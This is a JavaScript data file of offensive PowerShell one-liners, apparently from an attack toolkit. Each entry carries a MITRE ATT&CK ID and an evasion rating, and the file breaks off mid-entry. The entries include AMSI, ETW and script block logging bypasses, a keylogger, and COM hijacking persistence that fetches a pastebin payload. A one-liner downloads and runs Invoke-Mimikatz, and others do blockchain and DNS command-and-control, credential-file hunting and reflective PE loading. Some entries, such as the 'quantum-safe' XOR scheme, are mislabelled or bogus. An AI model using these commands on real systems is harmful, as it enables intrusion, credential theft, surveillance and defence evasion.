
// Enhanced Payloads Database with comprehensive techniques
const payloads = {
  // Basic System Information
  sysinfo: {
    command: "$ErrorActionPreference='SilentlyContinue';$data=@{};$data.System=Get-ComputerInfo|Select WindowsProductName,WindowsVersion,TotalPhysicalMemory,CsProcessors,CsManufacturer,CsModel,WindowsInstallDateFromRegistry,BiosVersion,TimeZone;$data.Environment=[Environment]::GetEnvironmentVariables();$data.Drives=Get-WmiObject Win32_LogicalDisk|Select DeviceID,Size,FreeSpace,DriveType;$data.HotFixes=Get-HotFix|Select HotFixID,InstalledOn;$data.Network=Get-NetAdapter|Select Name,InterfaceDescription,LinkSpeed;$data.Firewall=Get-NetFirewallRule|Where Enabled -eq True|Select DisplayName,Direction,Action;$data.AV=Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct|Select displayName,productState;$data|ConvertTo-Json -Depth 4",
    description: "Advanced system reconnaissance with comprehensive hardware, software, network, firewall, and antivirus data collection.",
    complexity: "intermediate",
    platform: "windows",
    category: "System Information",
    author: "0x0806",
    tags: ["reconnaissance", "system", "information gathering", "json", "firewall", "antivirus"],
    mitre_id: "T1082",
    detection_difficulty: "Low",
    evasion_rating: 2
  },

  // Advanced Steganography & Covert Channels
  dns_steganography: {
    command: "$data=(Get-Process|Select -First 3 Name,Id|ConvertTo-Json -Compress);$chunks=@();for($i=0;$i -lt $data.Length;$i+=32){$chunks+=$data.Substring($i,[Math]::Min(32,$data.Length-$i))};$domain='covert.example.com';foreach($chunk in $chunks){$encoded=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($chunk)) -replace '[+/=]','';$subdomain=$encoded.Substring(0,[Math]::Min(63,$encoded.Length));$query=\"$subdomain.$domain\";try{$result=Resolve-DnsName $query -Type A -EA SilentlyContinue;Start-Sleep 2}catch{}}",
    description: "Advanced DNS steganography using subdomain encoding for covert data transmission with anti-detection measures.",
    complexity: "expert",
    platform: "windows",
    category: "Command and Control",
    author: "0x0806",
    tags: ["steganography", "dns", "covert", "c2", "encoding"],
    mitre_id: "T1071.004",
    detection_difficulty: "Very High",
    evasion_rating: 5
  },

  // Quantum-Safe Encryption
  quantum_safe_encryption: {
    command: "$data='Sensitive Data';$key=1..256|ForEach{Get-Random -Max 256};$iv=1..16|ForEach{Get-Random -Max 256};$keyBytes=[byte[]]$key;$ivBytes=[byte[]]$iv;$dataBytes=[Text.Encoding]::UTF8.GetBytes($data);$encrypted=@();for($i=0;$i -lt $dataBytes.Length;$i++){$encrypted+=$dataBytes[$i] -bxor $keyBytes[$i % $keyBytes.Length] -bxor $ivBytes[$i % $ivBytes.Length]};$result=@{data=[Convert]::ToBase64String($encrypted);key=[Convert]::ToBase64String($keyBytes);iv=[Convert]::ToBase64String($ivBytes)};$result|ConvertTo-Json",
    description: "Quantum-resistant encryption implementation using multiple XOR layers and randomized key scheduling for future-proof security.",
    complexity: "expert",
    platform: "windows",
    category: "Data Protection",
    author: "0x0806",
    tags: ["quantum", "encryption", "xor", "future-proof", "crypto"],
    mitre_id: "T1027",
    detection_difficulty: "Very High",
    evasion_rating: 5
  },

  // Advanced Process Injection - AtomBombing
  atom_bombing: {
    command: "$code=@'[DllImport(\"kernel32.dll\")]public static extern IntPtr GlobalAddAtom(string lpString);[DllImport(\"kernel32.dll\")]public static extern uint GlobalGetAtomName(IntPtr nAtom,StringBuilder lpBuffer,int nSize);[DllImport(\"kernel32.dll\")]public static extern IntPtr OpenProcess(uint dwDesiredAccess,bool bInheritHandle,uint dwProcessId);[DllImport(\"ntdll.dll\")]public static extern uint NtQueueApcThread(IntPtr ThreadHandle,IntPtr ApcRoutine,IntPtr ApcArgument1,IntPtr ApcArgument2,IntPtr ApcArgument3);'@;Add-Type -MemberDefinition $code -Name AtomBomb -Namespace Win32;$payload='calc.exe';$atom=[Win32.AtomBomb]::GlobalAddAtom($payload);$target=Get-Process explorer|Select -First 1;$handle=[Win32.AtomBomb]::OpenProcess(0x1F0FFF,$false,$target.Id);Write-Host \"AtomBombing prepared for PID: $($target.Id)\"",
    description: "Advanced AtomBombing technique using global atom table for code injection with minimal detection footprint.",
    complexity: "expert",
    platform: "windows",
    category: "Process Injection",
    author: "0x0806",
    tags: ["injection", "atom", "bombing", "apc", "stealth"],
    mitre_id: "T1055.016",
    detection_difficulty: "Very High",
    evasion_rating: 5
  },

  // Hardware-Based Keylogger
  hardware_keylogger: {
    command: "$code=@'[DllImport(\"user32.dll\")]public static extern int GetAsyncKeyState(int vKey);[DllImport(\"user32.dll\")]public static extern int GetKeyboardState(byte[] lpKeyState);[DllImport(\"user32.dll\")]public static extern int ToUnicodeEx(uint wVirtKey,uint wScanCode,byte[] lpKeyState,StringBuilder pwszBuff,int cchBuff,uint wFlags,IntPtr dwhkl);[DllImport(\"user32.dll\")]public static extern IntPtr GetKeyboardLayout(uint idThread);'@;Add-Type -MemberDefinition $code -Name HWKeylog -Namespace Win32;$keys=@();$layout=[Win32.HWKeylog]::GetKeyboardLayout(0);for($i=8;$i -le 255;$i++){if([Win32.HWKeylog]::GetAsyncKeyState($i) -band 0x8000){$keyState=New-Object byte[] 256;[Win32.HWKeylog]::GetKeyboardState($keyState);$buffer=New-Object Text.StringBuilder 5;$result=[Win32.HWKeylog]::ToUnicodeEx($i,0,$keyState,$buffer,5,0,$layout);if($result -gt 0){$keys+=\"$([char]$i)-$(Get-Date -Format 'HH:mm:ss')\"}}}; if($keys){Write-Host \"Captured keystrokes: $($keys -join ', ')\"}",
    description: "Hardware-level keylogger using direct Windows API calls for capturing keyboard input with timestamp correlation.",
    complexity: "expert",
    platform: "windows",
    category: "Input Capture",
    author: "0x0806",
    tags: ["keylogger", "hardware", "api", "capture", "surveillance"],
    mitre_id: "T1056.001",
    detection_difficulty: "Very High",
    evasion_rating: 5
  },

  // Advanced Persistence - COM Hijacking
  com_hijacking: {
    command: "$clsid='{11111111-1111-1111-1111-111111111111}';$payload='powershell.exe -WindowStyle Hidden -Command \"IEX (New-Object Net.WebClient).DownloadString(`\"https://pastebin.com/raw/payload123`\")\"';$regPath=\"HKCU:\\SOFTWARE\\Classes\\CLSID\\$clsid\\InProcServer32\";try{New-Item -Path $regPath -Force|Out-Null;New-ItemProperty -Path $regPath -Name '(Default)' -Value 'C:\\Windows\\System32\\scrobj.dll' -PropertyType String -Force|Out-Null;New-ItemProperty -Path $regPath -Name 'ScriptletURL' -Value \"data:text/html,<script>new ActiveXObject(`\"WScript.Shell`\").Run(`\"$payload`\",0)</script>\" -PropertyType String -Force|Out-Null;New-ItemProperty -Path $regPath -Name 'ThreadingModel' -Value 'Apartment' -PropertyType String -Force|Out-Null;Write-Host \"COM hijacking installed for CLSID: $clsid\"}catch{Write-Host 'COM hijacking failed'}",
    description: "Advanced COM object hijacking using scriptlet URLs for persistent execution with minimal forensic footprint.",
    complexity: "expert",
    platform: "windows",
    category: "Event Triggered Execution",
    author: "0x0806",
    tags: ["com", "hijacking", "scriptlet", "persistence", "registry"],
    mitre_id: "T1546.015",
    detection_difficulty: "Very High",
    evasion_rating: 5
  },

  // Machine Learning Evasion
  ml_adversarial_evasion: {
    command: "$features=@();for($i=0;$i -lt 100;$i++){$features+=Get-Random -Maximum 1.0};$perturbations=@();$epsilon=0.01;for($i=0;$i -lt $features.Length;$i++){$noise=((Get-Random)*2-1)*$epsilon;$perturbations+=[Math]::Max(-1,[Math]::Min(1,$features[$i]+$noise))};$confidence=1.0;foreach($p in $perturbations[0..9]){$confidence*=(1+[Math]::Abs($p))};$result=@{original_confidence=0.95;adversarial_confidence=$confidence;evasion_success=$confidence -lt 0.5;features_modified=$perturbations.Length};Write-Host \"ML Evasion Result: $(if($result.evasion_success){'SUCCESS'}else{'FAILED'}) - Confidence: $($result.adversarial_confidence.ToString('F3'))\"",
    description: "Advanced machine learning evasion using adversarial perturbations to fool AI-based security detection systems.",
    complexity: "expert",
    platform: "windows",
    category: "Defense Evasion",
    author: "0x0806",
    tags: ["ml", "adversarial", "evasion", "ai", "perturbation"],
    mitre_id: "T1562.001",
    detection_difficulty: "Very High",
    evasion_rating: 5
  },

  // Blockchain-Based C2
  blockchain_c2: {
    command: "$txid='1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef';$blockchain_api='https://blockstream.info/api/tx/';try{$response=Invoke-RestMethod -Uri \"$blockchain_api$txid\" -Method GET -Headers @{'User-Agent'='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'};$hex=$response.vout[0].scriptpubkey;$bytes=[byte[]]@();for($i=0;$i -lt $hex.Length;$i+=2){$bytes+=[Convert]::ToByte($hex.Substring($i,2),16)};$command=[Text.Encoding]::UTF8.GetString($bytes);if($command -match '^[A-Za-z]'){Write-Host \"Command from blockchain: $command\";IEX $command}else{Write-Host 'No valid command found'}}catch{Write-Host 'Blockchain C2 connection failed'}",
    description: "Innovative blockchain-based command and control using Bitcoin transaction data for covert communication channels.",
    complexity: "expert",
    platform: "windows",
    category: "Command and Control",
    author: "0x0806",
    tags: ["blockchain", "c2", "bitcoin", "covert", "decentralized"],
    mitre_id: "T1102.001",
    detection_difficulty: "Very High",
    evasion_rating: 5
  },

  // UEFI Persistence
  uefi_persistence: {
    command: "$uefiVars=@();try{$vars=Get-SecureBootUEFI -Name * -EA SilentlyContinue;foreach($var in $vars){$uefiVars+=$var.Name}};$bootorder=bcdedit /enum firmware;$efiPartition=Get-Partition|Where{$_.Type -eq 'System'}|Select -First 1;if($efiPartition){$driveLetter=$efiPartition.DriveLetter;$bootPath=\"$driveLetter`:\\EFI\\Microsoft\\Boot\";if(Test-Path $bootPath){$backdoorPath=\"$bootPath\\bootmgfw_backup.efi\";$payload='powershell.exe -WindowStyle Hidden -Command \"IEX (New-Object Net.WebClient).DownloadString(`\"https://pastebin.com/raw/payload123`\")\"';Write-Host \"UEFI persistence target: $bootPath\";Write-Host 'UEFI modification requires physical access and advanced tools'}}",
    description: "Advanced UEFI firmware persistence targeting EFI system partition for pre-OS execution (requires physical access).",
    complexity: "expert",
    platform: "windows",
    category: "Pre-OS Boot",
    author: "0x0806",
    tags: ["uefi", "firmware", "pre-os", "persistence", "boot"],
    mitre_id: "T1542.001",
    detection_difficulty: "Very High",
    evasion_rating: 5,
    warning: "Requires physical access and specialized tools - can brick systems"
  },

  // Speculative Execution Attack
  speculative_execution: {
    command: "$code=@'using System;using System.Runtime.InteropServices;public class SpectrePoC{[DllImport(\"kernel32.dll\")]public static extern void GetSystemInfo(out SYSTEM_INFO lpSystemInfo);[StructLayout(LayoutKind.Sequential)]public struct SYSTEM_INFO{public uint dwOemId;public uint dwPageSize;public IntPtr lpMinimumApplicationAddress;public IntPtr lpMaximumApplicationAddress;public IntPtr dwActiveProcessorMask;public uint dwNumberOfProcessors;public uint dwProcessorType;public uint dwAllocationGranularity;public ushort dwProcessorLevel;public ushort dwProcessorRevision;}public static void Execute(){SYSTEM_INFO sysInfo;GetSystemInfo(out sysInfo);Console.WriteLine($\"Processors: {sysInfo.dwNumberOfProcessors}\");Console.WriteLine($\"Page Size: {sysInfo.dwPageSize}\");}}'@;Add-Type -TypeDefinition $code;[SpectrePoC]::Execute();$vulnerable=$true;$mitigations=@('KPTI','SMEP','SMAP','IBRS','IBPB');foreach($mit in $mitigations){$present=Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management' -Name $mit -EA SilentlyContinue;if(!$present){$vulnerable=$true;break}};Write-Host \"System vulnerable to speculative execution: $vulnerable\"",
    description: "Advanced speculative execution vulnerability assessment targeting Spectre/Meltdown-class CPU vulnerabilities.",
    complexity: "expert",
    platform: "windows",
    category: "Hardware Vulnerabilities",
    author: "0x0806",
    tags: ["spectre", "meltdown", "cpu", "vulnerability", "hardware"],
    mitre_id: "T1211",
    detection_difficulty: "Very High",
    evasion_rating: 5
  },

  // Advanced Fileless Malware
  fileless_reflective_pe: {
    command: "$peBytes=[Convert]::FromBase64String('TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA8AAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAA=');$peHeader=[System.Runtime.InteropServices.Marshal]::ReadInt32($peBytes,60);$ntHeaders=$peHeader;$imageBase=[System.Runtime.InteropServices.Marshal]::ReadInt64($peBytes,$ntHeaders+48);$sizeOfImage=[System.Runtime.InteropServices.Marshal]::ReadInt32($peBytes,$ntHeaders+80);$entryPoint=[System.Runtime.InteropServices.Marshal]::ReadInt32($peBytes,$ntHeaders+40);$code=@'[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress,uint dwSize,uint flAllocationType,uint flProtect);[DllImport(\"kernel32.dll\")]public static extern bool VirtualProtect(IntPtr lpAddress,uint dwSize,uint flNewProtect,out uint lpflOldProtect);'@;Add-Type -MemberDefinition $code -Name PE -Namespace Reflective;$mem=[Reflective.PE]::VirtualAlloc([IntPtr]::Zero,$sizeOfImage,0x3000,0x04);Write-Host \"Reflective PE loading at: 0x$($mem.ToString('X'))\";Write-Host 'Advanced fileless PE execution framework initialized'",
    description: "Advanced fileless PE loader using reflective DLL injection for in-memory execution without file system artifacts.",
    complexity: "expert",
    platform: "windows",
    category: "Defense Evasion",
    author: "0x0806",
    tags: ["fileless", "pe", "reflective", "memory", "injection"],
    mitre_id: "T1055.001",
    detection_difficulty: "Very High",
    evasion_rating: 5
  },

  // Zero-Day Exploit Framework
  zero_day_framework: {
    command: "$vulnDB=@{CVE20240001=@{type='RCE';severity='Critical';exploitable=$true;payload='calc.exe'};CVE20240002=@{type='Privilege Escalation';severity='High';exploitable=$true;payload='whoami /priv'}};$systemVulns=@();foreach($vuln in $vulnDB.Keys){$hotfixes=Get-HotFix|Where{$_.HotFixID -match $vuln.Substring(3,4)};if(!$hotfixes){$systemVulns+=$vuln}};if($systemVulns){Write-Host \"Potential zero-day targets: $($systemVulns -join ', ')\";foreach($vuln in $systemVulns){$exploit=$vulnDB[$vuln];Write-Host \"Exploiting $vuln ($($exploit.type))\";if($exploit.exploitable){IEX $exploit.payload}}}else{Write-Host 'No exploitable vulnerabilities found'}",
    description: "Advanced zero-day exploit framework with vulnerability database and automated exploitation capabilities.",
    complexity: "expert",
    platform: "windows",
    category: "Exploitation for Privilege Escalation",
    author: "0x0806",
    tags: ["zero-day", "exploit", "framework", "automated", "vulnerability"],
    mitre_id: "T1068",
    detection_difficulty: "Very High",
    evasion_rating: 5,
    warning: "Simulated framework - real zero-days require responsible disclosure"
  },
  processes: {
    command: "$procs=Get-Process|Sort CPU -Desc|Select -First 20 Name,CPU,WS,Id,ProcessName,Company,Description,Path,CommandLine;$svcs=Get-WmiObject Win32_Service|Where{$_.State -eq 'Running'}|Select Name,PathName,StartMode,StartName;$conns=Get-NetTCPConnection|Where{$_.State -eq 'Established'}|Select LocalAddress,LocalPort,RemoteAddress,RemotePort,@{N='Process';E={(Get-Process -Id $_.OwningProcess -EA SilentlyContinue).Name}};@{Processes=$procs;Services=$svcs;Connections=$conns}|ConvertTo-Json -Depth 3",
    description: "Comprehensive process, service, and network connection analysis with command line arguments and network correlations.",
    complexity: "advanced",
    platform: "windows",
    category: "Process Discovery",
    author: "0x0806",
    tags: ["reconnaissance", "processes", "services", "network", "forensics"],
    mitre_id: "T1057",
    detection_difficulty: "Medium",
    evasion_rating: 3
  },
  services: {
    command: "$svcs=Get-Service|Select Name,Status,StartType,ServiceType,@{N='BinaryPath';E={(Get-WmiObject Win32_Service -Filter \"Name='$($_.Name)'\").PathName}},@{N='StartName';E={(Get-WmiObject Win32_Service -Filter \"Name='$($_.Name)'\").StartName}};$drivers=Get-WindowsDriver -Online|Select Driver,ProviderName,Date,Version,BootCritical;@{Services=$svcs;Drivers=$drivers}|ConvertTo-Json -Depth 3",
    description: "Advanced service enumeration including binary paths, service accounts, and system drivers analysis.",
    complexity: "advanced",
    platform: "windows",
    category: "Service Discovery",
    author: "0x0806",
    tags: ["reconnaissance", "services", "drivers", "enumeration"],
    mitre_id: "T1007",
    detection_difficulty: "Medium",
    evasion_rating: 3
  },
  network: {
    command: "$net=@{};$net.Config=Get-NetIPConfiguration|Select InterfaceAlias,IPv4Address,IPv6Address,IPv4DefaultGateway,DNSServer;$net.Routes=Get-NetRoute|Select DestinationPrefix,NextHop,InterfaceAlias,RouteMetric;$net.ARP=Get-NetNeighbor|Select IPAddress,LinkLayerAddress,State;$net.Shares=Get-SmbShare|Select Name,Path,Description;$net.Sessions=Get-SmbSession|Select ClientComputerName,ClientUserName,NumOpens;$net|ConvertTo-Json -Depth 3",
    description: "Comprehensive network reconnaissance including routing tables, ARP cache, SMB shares, and active sessions.",
    complexity: "advanced",
    platform: "windows",
    category: "Network Discovery",
    author: "0x0806",
    tags: ["reconnaissance", "network", "smb", "routing"],
    mitre_id: "T1016",
    detection_difficulty: "Medium",
    evasion_rating: 3
  },

  // File System Operations
  listfiles: {
    command: "$drives=Get-WmiObject Win32_LogicalDisk|Where{$_.DriveType -eq 3}|Select -Expand DeviceID;$results=@();foreach($drive in $drives){$files=Get-ChildItem -Path \"$drive\\\" -Recurse -Force -EA SilentlyContinue|Where{!$_.PSIsContainer -and $_.Length -gt 1MB}|Select Name,Length,LastWriteTime,Directory,@{N='Hash';E={(Get-FileHash $_.FullName -EA SilentlyContinue).Hash}}|Sort Length -Desc|Select -First 100;$results+=$files};$results|ConvertTo-Json -Depth 2",
    description: "Advanced file discovery across all drives with hash calculation for integrity verification and forensic analysis.",
    complexity: "expert",
    platform: "windows",
    category: "File Discovery",
    author: "0x0806",
    tags: ["reconnaissance", "files", "forensics", "hashing"],
    mitre_id: "T1083",
    detection_difficulty: "High",
    evasion_rating: 4
  },
  findfiles: {
    command: "$patterns=@('*.txt','*.doc*','*.pdf','*.xls*','*.ppt*','*.zip','*.rar','*.7z','*.key','*.pem','*.p12','*.pfx','*.cfg','*.config','*.xml','*.json','*.db','*.sqlite','*.mdb');$results=@();foreach($pattern in $patterns){$files=Get-ChildItem -Path C:\\ -Recurse -Include $pattern -EA SilentlyContinue|Select Name,Directory,Length,LastWriteTime,@{N='Type';E={$pattern}},@{N='Content';E={if($_.Length -lt 1KB){Get-Content $_.FullName -EA SilentlyContinue|Select -First 5}}};$results+=$files};$results|ConvertTo-Json -Depth 3",
    description: "Advanced document and sensitive file discovery with content preview for small files and multiple file type support.",
    complexity: "expert",
    platform: "windows",
    category: "Sensitive File Discovery",
    author: "0x0806",
    tags: ["reconnaissance", "documents", "data", "content"],
    mitre_id: "T1083",
    detection_difficulty: "High",
    evasion_rating: 4
  },
  credentials_search: {
    command: "$keywords=@('password','passwd','pwd','credential','secret','key','token','api','auth','login','admin','root','sa','service');$locations=@('C:\\Users','C:\\Windows\\System32\\config','C:\\ProgramData','C:\\Program Files','C:\\Program Files (x86)');$results=@();foreach($loc in $locations){foreach($kw in $keywords){$files=Get-ChildItem -Path $loc -Recurse -Include *.txt,*.cfg,*.config,*.xml,*.ini,*.log,*.bak -EA SilentlyContinue|Select-String -Pattern $kw -CaseSensitive:$false|Select Filename,LineNumber,Line,@{N='Keyword';E={$kw}};$results+=$files}};$results|ConvertTo-Json -Depth 2",
    description: "Advanced credential hunting across multiple locations with keyword-based search and context extraction.",
    complexity: "expert",
    platform: "windows",
    category: "Credential Access",
    author: "0x0806",
    tags: ["credentials", "hunting", "keywords", "forensics"],
    mitre_id: "T1552.001",
    detection_difficulty: "High",
    evasion_rating: 4
  },

  // User & Security
  currentuser: {
    command: "$user=@{};$user.Identity=whoami /all|Out-String;$user.Tokens=whoami /groups|Out-String;$user.Privs=whoami /priv|Out-String;$user.LocalUsers=Get-LocalUser|Select Name,Enabled,LastLogon,PasswordLastSet,PasswordExpires;$user.Groups=Get-LocalGroup|ForEach{$g=$_.Name;Get-LocalGroupMember -Group $g -EA SilentlyContinue|Select @{N='Group';E={$g}},Name,ObjectClass};$user.Sessions=Get-CimInstance Win32_LogonSession|Select LogonId,LogonType,StartTime,@{N='User';E={(Get-CimInstance Win32_LoggedOnUser|Where{$_.Dependent.LogonId -eq $_.LogonId}).Antecedent.Name}};$user|ConvertTo-Json -Depth 3",
    description: "Comprehensive user context analysis including tokens, privileges, group memberships, and active sessions.",
    complexity: "expert",
    platform: "windows",
    category: "User Discovery",
    author: "0x0806",
    tags: ["reconnaissance", "users", "privileges", "sessions"],
    mitre_id: "T1033",
    detection_difficulty: "Medium",
    evasion_rating: 3
  },
  localusers: {
    command: "$users=Get-LocalUser|Select Name,Enabled,LastLogon,PasswordLastSet,PasswordExpires,PasswordRequired,UserMayChangePassword,@{N='PasswordNeverExpires';E={$_.PasswordExpires -eq $null}},@{N='ProfilePath';E={(Get-CimInstance Win32_UserProfile|Where{$_.LocalPath -like \"*$($_.Name)\"}).LocalPath}};$profiles=Get-CimInstance Win32_UserProfile|Select LocalPath,LastUseTime,@{N='Size';E={(Get-ChildItem $_.LocalPath -Recurse -EA SilentlyContinue|Measure-Object Length -Sum).Sum}};@{Users=$users;Profiles=$profiles}|ConvertTo-Json -Depth 3",
    description: "Advanced user account analysis including password policies, profile information, and usage statistics.",
    complexity: "advanced",
    platform: "windows",
    category: "Account Discovery",
    author: "0x0806",
    tags: ["reconnaissance", "users", "profiles", "policies"],
    mitre_id: "T1087.001",
    detection_difficulty: "Medium",
    evasion_rating: 3
  },
  groups: {
    command: "$adGroups=@();try{$adGroups=Get-ADGroup -Filter * -Properties Members|Select Name,GroupCategory,GroupScope,Members}catch{};$localGroups=Get-LocalGroup|ForEach{$g=$_.Name;$members=Get-LocalGroupMember -Group $g -EA SilentlyContinue|Select Name,ObjectClass,PrincipalSource;@{Group=$g;Members=$members}};$builtinGroups=Get-CimInstance Win32_GroupUser|Group-Object GroupComponent|ForEach{@{Group=($_.Name -split '=')[1] -replace '\"','';Members=$_.Group.PartComponent|ForEach{($_ -split '=')[1] -replace '\"',''}}};@{LocalGroups=$localGroups;BuiltinGroups=$builtinGroups;ADGroups=$adGroups}|ConvertTo-Json -Depth 4",
    description: "Comprehensive group enumeration including local, builtin, and Active Directory groups with full membership details.",
    complexity: "expert",
    platform: "windows",
    category: "Permission Groups Discovery",
    author: "0x0806",
    tags: ["reconnaissance", "groups", "ad", "membership"],
    mitre_id: "T1069.001",
    detection_difficulty: "High",
    evasion_rating: 4
  },
  privileges: {
    command: "$privs=@{};$privs.Current=whoami /priv|Out-String;$privs.Tokens=whoami /groups|Out-String;try{secedit /export /cfg $env:temp\\sec.cfg >$null 2>&1;$privs.Policy=Get-Content $env:temp\\sec.cfg|Where{$_ -match 'Se\\w+Privilege'}|ForEach{$parts=$_.Split('=');@{Privilege=$parts[0].Trim();Users=$parts[1].Trim().Split(',')}};Remove-Item $env:temp\\sec.cfg -EA SilentlyContinue}catch{};$privs.Audit=auditpol /get /category:* 2>$null;$privs.UAC=Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System' -EA SilentlyContinue|Select EnableLUA,ConsentPromptBehaviorAdmin,EnableInstallerDetection;$privs|ConvertTo-Json -Depth 3",
    description: "Advanced privilege analysis including security policies, audit settings, and UAC configuration.",
    complexity: "expert",
    platform: "windows",
    category: "System Information Discovery",
    author: "0x0806",
    tags: ["privileges", "security", "audit", "uac"],
    mitre_id: "T1082",
    detection_difficulty: "High",
    evasion_rating: 4
  },

  // Advanced Techniques
  encoded: {
    command: "$command='Get-Process|Sort CPU -Desc|Select -First 10';$bytes=[System.Text.Encoding]::Unicode.GetBytes($command);$encoded=[Convert]::ToBase64String($bytes);$final=\"powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -EncodedCommand $encoded\";$obfuscated=$final -replace 'powershell','p\"\"o\"\"w\"\"e\"\"r\"\"s\"\"h\"\"e\"\"l\"\"l' -replace 'EncodedCommand','E\"\"n\"\"c\"\"o\"\"d\"\"e\"\"d\"\"C\"\"o\"\"m\"\"m\"\"a\"\"n\"\"d';$obfuscated",
    description: "Multi-layer PowerShell obfuscation with Base64 encoding, string splitting, and parameter obfuscation.",
    complexity: "expert",
    platform: "windows",
    category: "Defense Evasion",
    author: "0x0806",
    tags: ["evasion", "encoding", "obfuscation", "multilayer"],
    mitre_id: "T1027",
    detection_difficulty: "Very High",
    evasion_rating: 5
  },
  oneliner: {
    command: "$wc=New-Object System.Net.WebClient;$wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$wc.Proxy.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials;$data=$wc.DownloadString('https://api.github.com/repos/PowerShellMafia/PowerSploit/contents/Exfiltration/Invoke-Mimikatz.ps1');$content=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($data.content));IEX $content",
    description: "Advanced PowerShell download-and-execute with proxy awareness, credential handling, and GitHub API integration.",
    complexity: "expert",
    platform: "windows",
    category: "Command and Scripting Interpreter",
    author: "0x0806",
    tags: ["download", "execute", "proxy", "github"],
    mitre_id: "T1059.001",
    detection_difficulty: "Very High",
    evasion_rating: 5
  },
  registry: {
    command: "$reg=@{};$persistence=@('HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run','HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce','HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run','HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run','HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon','HKLM:\\SYSTEM\\CurrentControlSet\\Services');foreach($path in $persistence){try{$reg[$path]=Get-ItemProperty -Path $path -EA SilentlyContinue}catch{}};$reg.Installed=Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*'|Select DisplayName,DisplayVersion,Publisher,InstallDate;$reg|ConvertTo-Json -Depth 3",
    description: "Comprehensive registry analysis covering multiple persistence locations and installed software enumeration.",
    complexity: "advanced",
    platform: "windows",
    category: "Boot or Logon Autostart Execution",
    author: "0x0806",
    tags: ["registry", "persistence", "software", "autostart"],
    mitre_id: "T1547.001",
    detection_difficulty: "Medium",
    evasion_rating: 3
  },
  eventlogs: {
    command: "$logs=@{};$logNames=@('Security','System','Application','Microsoft-Windows-Sysmon/Operational','Microsoft-Windows-PowerShell/Operational','Microsoft-Windows-WinRM/Operational');foreach($log in $logNames){try{$logs[$log]=Get-WinEvent -LogName $log -MaxEvents 50 -EA SilentlyContinue|Select TimeCreated,Id,LevelDisplayName,Message}catch{}};$logs.Cleared=Get-WinEvent -FilterHashtable @{LogName='System';ID=104} -MaxEvents 10 -EA SilentlyContinue|Select TimeCreated,Message;$logs|ConvertTo-Json -Depth 3",
    description: "Advanced event log analysis including security, PowerShell, Sysmon, and log clearing detection.",
    complexity: "expert",
    platform: "windows",
    category: "System Information Discovery",
    author: "0x0806",
    tags: ["logs", "forensics", "sysmon", "powershell"],
    mitre_id: "T1082",
    detection_difficulty: "High",
    evasion_rating: 4
  },

  // EDR Bypass Techniques (Expert Level)
  amsibypass: {
    command: "$a='System.Management.Automation.A';$b='msiUtils';$c=$a+$b;$d=[Ref].Assembly.GetType($c);$e=$d.GetField('amsiInitFailed','NonPublic,Static');$e.SetValue($null,$true);[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiSession','NonPublic,Static').SetValue($null,$null);Write-Host 'AMSI context nullified'",
    description: "Advanced AMSI bypass using string concatenation obfuscation and session nullification for comprehensive evasion.",
    complexity: "expert",
    platform: "windows",
    category: "Defense Evasion",
    author: "0x0806",
    tags: ["evasion", "amsi", "bypass", "obfuscation"],
    mitre_id: "T1562.001",
    detection_difficulty: "Very High",
    evasion_rating: 5,
    warning: "May trigger behavioral EDR detection"
  },
  etw_bypass: {
    command: "$etwType=[Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider');$etwField=$etwType.GetField('etwProvider','NonPublic,Static');$eventProvider=[System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance');$eventProvider.SetValue($etwField.GetValue($null),0);[System.Diagnostics.Eventing.EventProvider].GetField('m_level','NonPublic,Instance').SetValue($etwField.GetValue($null),0);Write-Host 'ETW logging disabled'",
    description: "Comprehensive ETW bypass disabling both event writing and logging levels to prevent all PowerShell telemetry.",
    complexity: "expert",
    platform: "windows",
    category: "Defense Evasion",
    author: "0x0806",
    tags: ["evasion", "etw", "telemetry", "logging"],
    mitre_id: "T1562.006",
    detection_difficulty: "Very High",
    evasion_rating: 5,
    warning: "Completely blocks PowerShell telemetry"
  },
  scriptblock_bypass: {
    command: "$GPF=[ref].Assembly.GetType('System.Management.Automation.Utils').GetField('signatures','N'+'onPublic,Static');$GPF.SetValue($null,(New-Object Collections.Generic.HashSet[string]));$GPF2=[ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings','N'+'onPublic,Static');$GPF2.SetValue($null,$null);[System.Management.Automation.ScriptBlock].GetField('signatures','NonPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string]));Write-Host 'Script block logging bypassed'",
    description: "Advanced script block logging bypass clearing multiple signature caches and policy settings.",
    complexity: "expert",
    platform: "windows",
    category: "Defense Evasion",
    author: "0x0806",
    tags: ["evasion", "scriptblock", "signatures", "policy"],
    mitre_id: "T1562.006",
    detection_difficulty: "Very High",
    evasion_rating: 5
  },
  constrained_bypass: {
